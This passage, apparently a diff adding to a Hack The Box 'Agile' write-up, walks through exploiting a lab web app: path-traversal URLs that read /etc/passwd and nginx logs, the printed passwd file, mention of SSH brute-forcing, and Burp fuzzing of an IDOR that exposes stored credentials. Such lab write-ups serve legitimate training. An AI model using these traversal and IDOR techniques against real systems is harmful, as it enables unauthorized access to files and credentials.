@@ -147,6 +147,139 @@ static                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 2
 vault                   [Status: 302, Size: 243, Words: 18, Lines: 6, Duration: 582ms]
 :: Progress: [32298/32298] :: Job [1/1] :: 51 req/sec :: Duration: [0:03:54] :: Errors: 0 ::
 ```
+Going to the ```/download``` directory
+
+![image](https://user-images.githubusercontent.com/67879936/224582704-7bc55bc3-6a27-4be0-975c-72ba874fc645.png)
+
+Lets view the source page
+
+![image](https://user-images.githubusercontent.com/67879936/224582737-7db520cc-502e-4b8d-93de-6fab65487828.png)
+
+We found this commented error code, what does this code says??
+
+><font color="Green">The error message "FileNotFoundError: [Errno 2] No such file or directory: '/tmp/None'" suggests that the file that the program is trying to open does not exist.
+
+The file path is '/tmp/None', which implies that the filename variable 'fn' might be None or empty. Therefore, when the program tries to open the file with the open() function, it cannot find the file and raises the FileNotFoundError.
+
+You can check whether the variable 'fn' is None or empty and ensure that the file exists at the specified location before opening it. Alternatively, you can use a try-except block to handle the FileNotFoundError and provide a more informative error message for the user.</font>
+
+Now, lets check for the variable ```fn```,
+
+Link: http://superpass.htb/download?fn=
+
+Running this gave me this
+
+![image](https://user-images.githubusercontent.com/67879936/224583384-6f030ae2-f1a7-4575-b34b-70601d489282.png)
+
+This kind of means we are probably sitting in the ```/tmp``` directory. Lets test this for possible LFI
+
+
+
+
+<h2>Exploitation</h2>
+
+Testing for possible LFI
+
+Link:http://superpass.htb/download?fn=../../../../../../../etc/passwd
+
+This downloads the ```/etc/passwd``` file to your machine in a ```.csv``` format
+
+![image](https://user-images.githubusercontent.com/67879936/224583544-2ca3598a-db86-4d4a-8b29-d9d6739630f2.png)
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Agile]
+└─$ ls
+superpass_export.csv
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Agile]
+└─$ file superpass_export.csv                                                                                        
+superpass_export.csv: ASCII text
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Agile]
+└─$ cat superpass_export.csv 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+corum:x:1000:1000:corum:/home/corum:/bin/bash
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
+runner:x:1001:1001::/app/app-testing/:/bin/sh
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
+_laurel:x:999:999::/var/log/laurel:/bin/false
+```
+cool, we have 3 possible users on this machine ```dev_admin```, ```corum```, ```edwards```. I tried bruteforcing the ssh passwords for each user but I couldnt't find any. After a while, I went on to view the log files ```/var/log/nginx/access.log```
+
+Link:http://superpass.htb/download?fn=../../../../../../../../var/log/nginx/access.log
+
+This downloads the log files to our machine, lets go ahead and view the logs. Going through the logs I found a new directory ```/add_row``` now this didn't appear when we did our directory enumeration,
+
+![image](https://user-images.githubusercontent.com/67879936/224584521-9bdc1902-4bfa-4ec2-a9ac-a7723c801b52.png)
+
+Going to the ```/add_row``` directory
+
+![image](https://user-images.githubusercontent.com/67879936/224585064-9ef6fbb3-0db8-436d-8ccd-f1dc884c59ae.png)
+
+After a while, I thought to myself if there was an ```/add_row``` directory, then there definitely would  be a ```/row``` directory. 
+
+Link:http://superpass.htb/vault/row/
+
+![image](https://user-images.githubusercontent.com/67879936/224585475-61fd38d9-e0c7-4bb6-8ad2-ff8415777176.png)
+
+We got a "Not Found" error, I went ahead to FUZZ the ```/row``` directory using burpsuite
+
+![image](https://user-images.githubusercontent.com/67879936/224587604-8710da3b-1087-40d8-a285-6d1e67f65ba6.png)
+![image](https://user-images.githubusercontent.com/67879936/224587661-7d16c751-8809-4d2a-b8cd-1ac715462481.png)
+
+I got this list of directories which might be available. So, starting with ```3```
+
+Link:http://superpass.htb/vault/row/3
+
+![image](https://user-images.githubusercontent.com/67879936/224587743-e53107ad-1a28-4809-a272-4d78f9476d62.png)
+
+Now, this presented us with a ```website```, ```username```, and a ```password```. 
+
+Trying other directories burp intruder gave us, I tried 4 next
+
+Link:http://superpass.htb/vault/row/4
+
+![image](https://user-images.githubusercontent.com/67879936/224587939-7d25737c-bfb3-4cc0-828d-35dd29705933.png)
+
+We found another credentials. At this point I knew we were dealing with a vulnerability called ``IDOR```
+
+> <font color="Green">IDOR, or Insecure Direct Object Reference, is a type of security vulnerability that arises when an application allows a user to access or manipulate resources by directly referencing them using an identifier, such as a file name, record ID, or user account number.
+
+If the application fails to properly authenticate and authorize user access to those resources, an attacker may be able to bypass those checks by manipulating the identifier, and gain unauthorized access to data or functionality that should be restricted.</font>
+
+To exploit this we'll be using burp intruder to fuzz 
+
+![image](https://user-images.githubusercontent.com/67879936/224588282-08667bc4-3634-4280-ac9e-e6edcf8290f1.png)
+
+
+
 
 
 
